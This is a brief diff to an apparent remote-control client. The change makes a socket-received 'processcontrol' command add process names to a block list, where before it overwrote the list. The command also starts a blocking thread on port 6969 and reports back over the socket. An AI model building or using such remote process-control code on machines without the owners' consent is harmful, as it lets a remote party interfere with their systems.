@@ -1961,8 +1961,7 @@ class Client():
                 try:
                     global blocked_process
                     data = data.replace("processcontrol ","").split()
-                    blocked_process = data
-                    print(data)
+                    blocked_process += data
                     threading.Thread(target=process_control, args=(6969,)).start()
                     self.sock.send(f"Process Control Enabled".encode("ascii"))
                 except Exception as e: self.sock.send(f"Error:\n\n{e}".encode("ascii"))
